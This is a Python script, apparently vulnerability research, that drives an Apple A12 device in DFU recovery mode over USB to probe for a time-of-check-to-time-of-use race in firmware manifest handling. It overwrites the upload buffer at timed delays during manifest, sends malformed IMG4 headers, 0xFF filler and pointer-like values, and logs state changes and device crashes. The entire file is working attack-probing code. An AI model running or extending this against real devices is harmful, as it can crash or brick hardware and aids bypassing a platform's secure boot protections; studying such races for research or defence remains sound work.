#!/usr/bin/env python3
"""
A12 TOCTOU Race — v3 (Fast & Robust)
States: 2=IDLE, 5=DNLOAD-IDLE, 6=MANIFEST-SYNC, 7=MANIFEST, 8=MANIFEST-WAIT-RESET, 10=ERROR
"""
import time, json, struct, statistics
from datetime import datetime
from pathlib import Path
import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
be = lambda: usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

class DFU:
    def __init__(self):
        self.dev = None

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def get_status(self):
        try:
            r = self.dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=5000)
            return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r)>=6 else None
        except: return None

    def dnload(self, data, timeout=5000):
        try:
            self.dev.ctrl_transfer(0x21, 1, 0, 0, data, timeout=timeout)
            return True
        except: return False

    def abort(self):
        try: self.dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=1000); return True
        except: return False

    def clr_status(self):
        try: self.dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=1000); return True
        except: return False

    def usb_reset(self):
        try: self.dev.reset(); return True
        except: return False

    def to_idle(self, max_tries=20):
        """Get back to state 2 (dfuIDLE) robustly"""
        for _ in range(max_tries):
            s = self.get_status()
            if not s:
                time.sleep(0.3)
                self.connect()
                continue
            st = s[0]
            if st == 2: return True
            if st == 10: self.clr_status()         # ERROR → clear
            elif st == 5: self.abort()              # DNLOAD-IDLE → abort
            elif st == 3: self.abort()              # DNLOAD-SYNC → abort  
            elif st == 6: self.get_status()         # MANIFEST-SYNC → poll
            elif st == 7: time.sleep(0.01)          # MANIFEST → wait
            elif st == 8:                           # MANIFEST-WAIT-RESET
                self.usb_reset()
                time.sleep(1)
                self.connect()
            elif st == 4:                           # DNLOAD-BUSY
                time.sleep(s[2]/1000.0 + 0.05)
            else:
                self.abort()
            time.sleep(0.02)
        return False

    def alive(self):
        try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be()) is not None
        except: return False

    def wait_dev(self, t=10):
        t0 = time.time()
        while time.time()-t0 < t:
            if self.connect(): return True
            time.sleep(0.3)
        return False


def run():
    d = DFU()
    log("="*60)
    log("A12 TOCTOU v3 — Fast Race Test")
    log("="*60)

    if not d.connect():
        log("NO DFU DEVICE"); return

    s = d.get_status()
    log(f"Initial: state={s}")
    
    if not d.to_idle():
        log("Can't reach IDLE"); return
    log(f"Ready in IDLE")

    results = {}

    # ============= TEST 1: Quick state map =============
    log("\n--- Test 1: State after DNLOAD ---")
    for size in [0, 16, 256, 2048]:
        if not d.to_idle():
            log(f"  {size}B: idle FAIL"); d.wait_dev(); d.to_idle(); continue
        ok = d.dnload(bytes(size))
        s = d.get_status()
        log(f"  {size:5d}B: dn={'OK' if ok else 'FAIL'} → state={s[0] if s else 'X'} bst={s[1] if s else '?'} poll={s[2] if s else '?'}")

    # ============= TEST 2: Manifest window =============
    log("\n--- Test 2: Manifest window (rapid poll) ---")
    for trial in range(2):
        if not d.to_idle(): d.wait_dev(); d.to_idle()
        d.dnload(bytes(2048))
        s = d.get_status()
        if not s or s[0] != 5:
            log(f"  trial {trial}: not state 5 ({s})"); continue
        d.dnload(b"")  # trigger manifest
        t0 = time.perf_counter_ns()
        states = []
        for i in range(50):
            s = d.get_status()
            us = (time.perf_counter_ns()-t0)/1000
            if not s: break
            states.append((round(us), s[0], s[1]))
            if s[0] in (2, 8, 10): break
        log(f"  trial {trial}: {len(states)} polls")
        prev = None
        for us, st, bs in states:
            if st != prev:
                log(f"    state={st} bstatus={bs} @ {us}us")
                prev = st

    # ============= TEST 3: TOCTOU overwrite during manifest =============
    log("\n--- Test 3: TOCTOU — overwrite during manifest ---")
    
    overwrite = b"\xDE\xAD\xBE\xEF" * 512  # 2048B
    
    for delay_us in [0, 50, 200, 500, 1000, 2000, 5000]:
        if not d.to_idle():
            if not d.wait_dev() or not d.to_idle():
                log(f"  delay={delay_us}: can't recover"); continue

        # Step 1: DNLOAD 2048B zeros
        d.dnload(bytes(2048))
        s = d.get_status()
        if s[0] != 5: log(f"  delay={delay_us}: not state 5"); continue

        # Step 2: trigger manifest
        d.dnload(b"")
        
        # Step 3: GET_STATUS to enter manifest
        t0 = time.perf_counter_ns()
        s = d.get_status()
        entry = s[0] if s else -1

        # Step 4: wait delay
        if delay_us > 0:
            target = time.perf_counter_ns() + delay_us * 1000
            while time.perf_counter_ns() < target: pass

        # Step 5: OVERWRITE 
        t_ow = time.perf_counter_ns()
        ow_ok = d.dnload(overwrite)
        ow_us = (time.perf_counter_ns() - t_ow) / 1000

        # Step 6: Check result
        s = d.get_status()
        after = s[0] if s else -1
        alive = d.alive()
        crashed = not alive
        
        log(f"  delay={delay_us:5d}us: entry={entry} ow={'OK' if ow_ok else 'FAIL'} "
            f"ow_time={ow_us:.0f}us after={after} "
            f"{'**CRASH**' if crashed else 'alive'}")
        
        if crashed:
            log("  >>> DEVICE CRASHED! Waiting for reconnect...")
            d.wait_dev()

    # ============= TEST 4: Double manifest =============
    log("\n--- Test 4: Double manifest (overwrite → re-manifest) ---")
    
    for desc, p1, p2 in [
        ("zeros→img4",  bytes(2048), b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
        ("zeros→crash", bytes(2048), b"\x30\x80" + b"\xFF" * 2046),
        ("zeros→ptr",   bytes(2048), struct.pack("<Q", 0x100000000) * 256),
    ]:
        if not d.to_idle():
            d.wait_dev(); d.to_idle()
        
        # Manifest #1
        d.dnload(p1)
        s = d.get_status()
        if not s or s[0] != 5: continue
        d.dnload(b"")       # trigger manifest
        s = d.get_status()  # enter manifest processing

        # Overwrite with p2
        ow_ok = d.dnload(p2)
        s = d.get_status()
        ow_state = s[0] if s else -1

        # If in DNLOAD-IDLE, trigger 2nd manifest 
        m2_state = None
        final = None
        if ow_state == 5:
            d.dnload(b"")  # 2nd manifest
            t0 = time.perf_counter_ns()
            for _ in range(50):
                s = d.get_status()
                if not s or s[0] in (2, 8, 10): break
            dt = (time.perf_counter_ns()-t0)/1000
            m2_state = s[0] if s else -1
            final = m2_state
        else:
            final = ow_state

        alive = d.alive()
        log(f"  {desc:15s}: ow={'OK' if ow_ok else 'FAIL'} ow_state={ow_state} "
            f"m2={m2_state} final={final} alive={alive}")
        
        if not alive:
            log(f"  >>> CRASH on {desc}!")
            d.wait_dev()

    # ============= TEST 5: Race timing comparison =============
    log("\n--- Test 5: Timing — does overwrite affect manifest? ---")
    
    def measure_manifest(payload, n=5):
        times = []
        for _ in range(n):
            if not d.to_idle(): d.wait_dev(); d.to_idle()
            d.dnload(payload)
            d.get_status()
            d.dnload(b"")
            t0 = time.perf_counter_ns()
            for _ in range(50):
                s = d.get_status()
                if not s or s[0] in (2, 8, 10): break
            times.append((time.perf_counter_ns()-t0)/1000)
        return times

    t_base = measure_manifest(bytes(2048))
    log(f"  Baseline (zeros):    med={statistics.median(t_base):.0f}us {[round(t) for t in t_base]}")

    t_img4 = measure_manifest(b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))
    log(f"  IMG4 direct:         med={statistics.median(t_img4):.0f}us {[round(t) for t in t_img4]}")

    # With immediate overwrite
    ow_times = []
    for _ in range(5):
        if not d.to_idle(): d.wait_dev(); d.to_idle()
        d.dnload(bytes(2048))
        d.get_status()
        d.dnload(b"")
        d.get_status()  # enter manifest
        d.dnload(b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038))  # overwrite
        s = d.get_status()
        if s and s[0] == 5:
            d.dnload(b"")
            t0 = time.perf_counter_ns()
            for _ in range(50):
                s = d.get_status()
                if not s or s[0] in (2, 8, 10): break
            ow_times.append((time.perf_counter_ns()-t0)/1000)
    if ow_times:
        log(f"  OW zeros→img4:       med={statistics.median(ow_times):.0f}us {[round(t) for t in ow_times]}")
    
    # Compare
    if t_base and t_img4:
        diff = statistics.median(t_img4) - statistics.median(t_base)
        log(f"\n  IMG4 vs Zeros diff: {diff:+.0f}us")
    if ow_times and t_base:
        diff2 = statistics.median(ow_times) - statistics.median(t_base)
        log(f"  OW(zeros→img4) vs Zeros diff: {diff2:+.0f}us")

    # Save
    outf = Path(__file__).parent / "results" / "toctou_v3.json"
    outf.parent.mkdir(exist_ok=True)
    with open(outf, "w") as f:
        json.dump(results, f, indent=2, default=str)
    log(f"\nSaved: {outf}")
    log("DONE")


if __name__ == "__main__":
    run()
